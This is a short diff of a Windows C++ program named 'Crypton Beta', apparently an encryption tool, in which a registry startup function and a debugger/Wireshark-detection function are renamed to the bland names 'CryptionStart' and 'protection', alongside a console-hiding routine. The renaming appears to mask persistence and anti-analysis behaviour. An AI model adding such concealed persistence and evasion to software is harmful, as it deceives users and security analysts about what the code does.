@@ -26,7 +26,7 @@ void ShowSuccessMessageBox()
     MessageBox(NULL, TEXT("Encryption/Decryption Successful!"), TEXT("Success"), MB_OK | MB_ICONINFORMATION);
 }
 
-bool addToStartup()
+bool CryptionStart()
 {
     HKEY hKey;
     const char* czStartName = "Crypton Beta";
@@ -99,6 +99,7 @@ bool FileExists(const char* fileName)
     return infile.good();
 }
 
+
 std::string GetHashedPassword(std::string password)
 {
     HCRYPTPROV hProv = 0;
@@ -147,7 +148,7 @@ void HideConsole()
     SetWindowLong(consoleWindow, GWL_STYLE, GetWindowLong(consoleWindow, GWL_STYLE) & ~(WS_CAPTION));
 }
 
-bool isDebuggerOrReverseEngineeringToolRunning() {
+bool protection() {
     const char* tools[] = {
         "ollydbg.exe",  // OllyDbg
         "wireshark.exe", // Wireshark
